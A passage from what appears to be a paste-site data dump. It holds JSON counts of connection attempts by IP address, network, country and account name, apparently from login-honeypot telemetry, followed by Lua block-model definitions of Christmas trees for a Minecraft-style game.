    ""136.239.159.27"": 25,
    ""120.240.145.8"": 1,
    ""45.131.195.22"": 1,
    ""165.154.12.127"": 1,
    ""198.235.24.207"": 3,
    ""62.204.41.123"": 4,
    ""173.239.214.157"": 1,
    ""43.129.180.247"": 1,
    ""194.165.16.11"": 2,
    ""20.42.97.24"": 2,
    ""80.66.88.215"": 1,
    ""198.235.24.248"": 3,
    ""162.142.125.224"": 1,
    ""80.66.76.92"": 2,
    ""188.119.66.107"": 1
  },
  ""asn"": {
    ""AS57523"": 99,
    ""AS59425"": 6,
    ""AS48721"": 6,
    ""AS63949"": 3,
    ""AS396982"": 12,
    ""AS208091"": 7,
    ""AS60068"": 1,
    ""AS174"": 8,
    ""AS14061"": 7,
    ""AS151853"": 2,
    ""AS197414"": 8,
    ""AS398705"": 1,
    ""AS267784"": 4,
    ""AS204428"": 1,
    ""AS4837"": 1,
    ""AS7713"": 1,
    ""AS62240"": 3,
    ""AS17639"": 25,
    ""AS56040"": 1,
    ""AS135377"": 1,
    ""AS132203"": 1,
    ""AS8075"": 2,
    ""AS398324"": 1
  },
  ""isp"": {
    ""Chang Way Technologies Co. Limited"": 99,
    ""Horizon LLC"": 6,
    ""Flyservers S.A."": 10,
    ""Akamai Technologies, Inc."": 1,
    ""Linode"": 1,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 14,
    ""PRCDN-CONSUMER-FR-PAR"": 1,
    ""Cogent Communications"": 8,
    ""DigitalOcean, LLC"": 7,
    ""Giza Network Limited"": 2,
    ""Censys, Inc."": 2,
    ""SS-Net"": 1,
    ""China Unicom Chongqing Province Network"": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Akamai Technologies"": 1,
    ""VPN"": 2,
    ""Converge Information and Communications Technology Solutions"": 25,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""LogicWeb Inc."": 1,
    ""Aceville Pte.ltd"": 1,
    ""Microsoft Corporation"": 2,
    ""Xhost Internet Solutions"": 1
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 99,
    ""Horizon LLC"": 6,
    ""Flyservers S.A"": 6,
    ""Linode"": 2,
    ""Linode, LLC"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 6,
    ""Unknown"": 11,
    ""DigitalOcean, LLC"": 7,
    ""Giza Network Limited"": 2,
    ""Xhostis"": 8,
    ""Censys, Inc."": 1,
    ""UAB Host Baltic"": 4,
    ""4Media Ltd"": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""VPN-Consumer-US"": 2,
    ""Converge Information and Communications Technology Solutions, Inc"": 25,
    ""China Mobile"": 1,
    ""Ucloud Information Technology"": 1,
    ""NSQ-VENTURE"": 1,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""XHOSTIS"": 1,
    ""Censys Inc"": 1
  },
  ""regionName"": {
    ""Moscow"": 105,
    ""Kaunas"": 6,
    ""New Jersey"": 5,
    ""England"": 1,
    ""California"": 19,
    ""North Holland"": 14,
    ""\u00cele-de-France"": 1,
    ""Hesse"": 9,
    ""Ho Chi Minh"": 2,
    ""Vilnius"": 4,
    ""Plovdiv"": 1,
    ""Chongqing"": 1,
    ""Jakarta"": 1,
    ""Metro Manila"": 25,
    ""Guangdong"": 1,
    ""Dubai"": 1,
    ""Central and Western District"": 1,
    ""Virginia"": 2,
    ""Drenthe"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""Russia"": 105,
    ""Lithuania"": 10,
    ""United States"": 27,
    ""United Kingdom"": 1,
    ""The Netherlands"": 15,
    ""France"": 1,
    ""Germany"": 9,
    ""Vietnam"": 2,
    ""Bulgaria"": 1,
    ""China"": 2,
    ""Indonesia"": 1,
    ""Philippines"": 25,
    ""United Arab Emirates"": 1,
    ""Hong Kong"": 1
  },
  ""account"": {
    ""Administr"": 110,
    ""Test"": 13,
    ""(empty)"": 8,
    ""hello"": 42,
    ""OJflFtniW"": 1,
    ""bGHSaG"": 1,
    ""pQnxTA"": 1,
    ""Domain"": 10,
    ""mUchHhkbA"": 1,
    ""GhxFdf"": 1,
    ""MUBDTA"": 1,
    ""bkrccvfc"": 4,
    ""beio"": 1,
    ""Administrator"": 1,
    ""iQQCaZCEZ"": 1,
    ""RIlJuU"": 1,
    ""xFiSDE"": 1,
    ""xsbXvbIAI"": 1,
    ""ThPUYj"": 1,
    ""GaJlUI"": 1
  },
  ""keyboard"": {
    ""Unknown"": 201
  },
  ""client_build"": {
    ""Unknown"": 201
  },
  ""client_name"": {
    ""Unknown"": 201
  },
  ""ip_type"": {
    ""proxy"": 100,
    ""Unknown"": 62,
    ""hosting"": 23,
    ""mobile & hosting & proxy"": 1,
    ""mobile & proxy"": 8,
    ""hosting & proxy"": 6,
    ""mobile"": 1
  }
}"
4i4mPXbc,Ёлка (внешний ресурс),Dreamlight_MCSkill,Lua,Thursday 7th of March 2024 06:07:38 PM CDT,"{
  label = ""Ёлка"",
  shapes = {
    { 6,0,15,8,4,16,texture = ""snow"", tint = 0xff6666 },
    { 11,0,5,13,3,6,texture = ""snow"", tint = 0x770000 },
    { 11,0,6,16,3,7,texture = ""snow"", tint = 0xff9900 },
    { 11,0,7,13,3,11,texture = ""snow"", tint = 0x770000 },
    { 13,0,5,14,3,11,texture = ""snow"", tint = 0xff9900 },
    { 14,0,5,16,3,6,texture = ""snow"", tint = 0x770000 },
    { 14,0,7,16,3,11,texture = ""snow"", tint = 0x770000 },
    { 15,0,15,16,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 4,5,14,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,11,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,9,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,8,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,6,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,5,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,4,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,14,16,8,15,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,7,12,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,9,7,8,10,texture = ""snow"", tint = 0xffff66 },
    { 6,7,10,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,9,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,8,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,7,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,6,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,5,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,7,4,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,13,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,11,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,9,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,8,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,7,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,8,6,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 14,8,5,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,14,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,12,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,10,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,9,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,8,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,9,7,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,9,6,13,10,7,texture = ""snow"", tint = 0xffff66 },
    { 13,9,6,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,9,5,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,10,14,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,12,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,10,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,9,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,8,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,10,7,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,10,6,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,14,16,13,15,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,13,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,11,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,10,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,12,9,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,12,8,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,12,7,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,12,6,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,14,8,14,15,texture = ""snow"", tint = 0xffff66 },
    { 8,13,13,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,13,11,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,13,10,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,13,9,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,13,8,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,13,7,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,14,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,14,12,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,10,11,15,11,texture = ""snow"", tint = 0xffff66 },
    { 10,14,11,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,14,10,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,14,9,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,14,8,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 15,14,7,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,15,14,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 9,15,12,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,15,11,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,15,10,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,15,9,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,15,8,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 4,0,1,10,4,2,texture = ""snow"", tint = 0xff6666 },
    { 4,0,2,11,4,3,texture = ""iron_block"", tint = 0xcc66cc },
    { 5,0,0,9,4,2,texture = ""snow"", tint = 0xff6666 },
    { 5,0,3,11,4,4,texture = ""snow"", tint = 0xff6666 },
    { 6,0,4,12,4,5,texture = ""snow"", tint = 0xff6666 },
    { 7,0,5,13,4,6,texture = ""snow"", tint = 0xff6666 },
    { 7,0,6,14,4,7,texture = ""iron_block"", tint = 0xcc66cc },
    { 8,0,7,14,4,8,texture = ""snow"", tint = 0xff6666 },
    { 9,0,8,13,4,9,texture = ""snow"", tint = 0xff6666 },
    { 10,0,9,12,4,10,texture = ""snow"", tint = 0xff6666 },
    { 15,0,0,16,5,1,texture = ""quartz_block_side"", tint = 0x663300 },
    { 5,5,0,16,8,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,3,16,7,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,4,16,7,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,16,7,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,7,16,7,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,8,16,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,9,16,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,10,16,7,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,5,11,16,8,12,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,3,16,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,5,16,8,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,6,16,8,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,7,16,8,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,8,16,8,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,9,11,8,10,texture = ""snow"", tint = 0xffff66 },
    { 11,7,9,16,8,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,7,10,16,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,0,16,9,2,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,2,7,9,3,texture = ""snow"", tint = 0xffff66 },
    { 7,8,2,16,9,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,4,16,9,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,6,16,9,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,7,16,9,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,8,8,16,9,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 14,8,9,16,9,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,0,16,10,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,1,16,10,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,3,16,10,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,5,16,10,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,6,16,10,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,9,7,16,10,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,9,8,16,10,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,9,9,16,10,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,10,0,16,12,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,3,16,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,5,16,12,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,6,16,12,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,10,7,16,12,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,10,8,16,12,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,0,16,13,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,2,16,13,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,4,16,13,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,12,5,16,13,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,12,6,16,13,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,12,7,16,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,12,8,16,13,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,13,0,16,14,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,13,2,16,14,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,13,4,16,14,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,13,5,16,14,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,13,6,16,14,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,13,7,16,14,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,0,16,15,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,14,1,16,15,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,3,16,15,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,4,11,15,5,texture = ""snow"", tint = 0xffff66 },
    { 11,14,4,16,15,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,14,5,16,15,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,14,6,16,15,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 15,14,7,16,15,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,15,0,16,16,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,15,3,16,16,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,15,4,16,16,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,15,5,16,16,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,15,6,16,16,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,15,7,16,16,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 8,0,14,16,1,15,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 9,0,13,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,0,12,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,0,11,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,0,10,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,0,9,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,0,8,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,1,14,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,1,12,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,1,11,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,1,10,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,1,9,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,2,15,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,2,13,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,2,10,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,2,9,16,3,10,texture = ""snow"", tint = 0xffff66 },
    { 11,3,13,12,4,14,texture = ""snow"", tint = 0xffff66 },
    { 11,3,14,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,3,12,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,3,11,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,3,10,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,4,14,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,12,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,4,11,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,5,15,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,5,13,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 14,5,12,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,6,15,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,6,13,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,6,12,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,7,14,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,7,12,15,8,13,texture = ""snow"", tint = 0xffff66 },
    { 14,7,13,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,7,12,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,8,15,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,8,14,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,8,13,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,10,14,16,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,10,13,16,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 14,11,15,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,11,13,16,12,14,texture = ""snow"", tint = 0xffff66 },
    { 15,11,14,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,14,15,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 9,0,0,16,1,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,0,2,16,1,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,0,3,16,1,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,0,4,16,1,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,0,5,16,1,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,0,6,16,1,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,0,7,16,1,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,1,0,16,2,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,1,1,16,2,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,1,3,16,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,1,4,16,2,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,1,5,16,2,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,2,0,16,3,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,2,2,16,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,2,4,16,3,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,3,0,16,4,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,3,1,16,4,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,3,3,16,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,3,4,16,4,5,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,4,0,16,5,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,1,16,5,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,3,14,5,4,texture = ""snow"", tint = 0xffff66 },
    { 15,4,3,16,5,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,5,0,16,6,2,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 14,5,2,16,6,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,6,0,16,7,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,6,2,16,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,7,0,16,8,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,7,1,16,8,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,7,2,16,8,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,8,0,16,10,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,8,1,16,10,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,9,2,16,10,3,texture = ""snow"", tint = 0xffff66 },
    { 14,10,0,16,11,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,10,1,16,11,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,11,0,16,14,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 15,1,15,16,2,16,texture = ""snow"", tint = 0xffcc66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,5,1,3,6,texture = ""snow"", tint = 0x770000 },
    { 0,0,6,1,3,7,texture = ""snow"", tint = 0xff9900 },
    { 0,0,7,1,3,11,texture = ""snow"", tint = 0x770000 },
    { 0,0,14,2,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 2,0,15,3,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 4,0,9,6,2,10,texture = ""snow"", tint = 0x330099 },
    { 4,0,10,8,2,11,texture = ""snow"", tint = 0x33ccff },
    { 4,0,11,6,2,12,texture = ""snow"", tint = 0x330099 },
    { 6,0,9,7,2,12,texture = ""snow"", tint = 0x33ccff },
    { 7,0,9,8,2,10,texture = ""snow"", tint = 0x330099 },
    { 7,0,11,8,2,12,texture = ""snow"", tint = 0x330099 },
    { 7,0,15,8,4,16,texture = ""snow"", tint = 0x0000cc },
    { 8,0,15,9,4,16,texture = ""snow"", tint = 0x663366 },
    { 9,0,15,11,4,16,texture = ""snow"", tint = 0x0000cc },
    { 0,5,3,2,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,4,5,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,5,7,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,8,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,7,9,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,8,10,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,9,11,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,11,12,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,15,13,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,7,4,4,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 1,7,3,2,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,5,6,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,6,7,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,7,8,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,8,9,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,9,10,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,10,11,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,12,12,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,8,5,2,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,8,5,3,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 3,8,6,5,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,8,5,5,9,6,texture = ""snow"", tint = 0xffff66 },
    { 5,8,7,7,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,8,8,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,9,9,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,11,10,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,13,11,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,9,6,4,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,9,7,6,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,8,7,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,9,8,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,10,9,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,11,10,10,12,texture = ""snow"", tint = 0xffff66 },
    { 9,9,12,10,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,14,11,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,10,5,2,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,6,4,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,10,7,6,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,8,7,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
